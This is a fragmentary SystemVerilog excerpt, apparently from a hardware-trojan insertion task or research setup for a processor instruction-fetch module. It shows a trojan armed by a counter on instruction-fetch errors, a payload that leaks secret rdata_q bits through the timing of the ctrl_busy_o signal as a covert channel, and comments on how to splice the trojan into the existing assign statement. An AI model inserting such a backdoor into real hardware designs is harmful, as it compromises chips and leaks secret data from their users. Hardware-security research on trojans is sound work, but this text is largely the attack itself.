 ...
 *   
 * Trigger: Counter on instr_fetch_err_i
 * Payload: Modulate ctrl_busy_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |instr_fetch_err_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of ctrl_busy_o:
...
logic       covert_bit_out;         // Drives ctrl_busy_o when trojan active
...
//   Find the assign for ctrl_busy_o (or rd_error_o as fallback):
//     assign ctrl_busy_o = <normal_expr>;
//   Replace with:
//     assign ctrl_busy_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
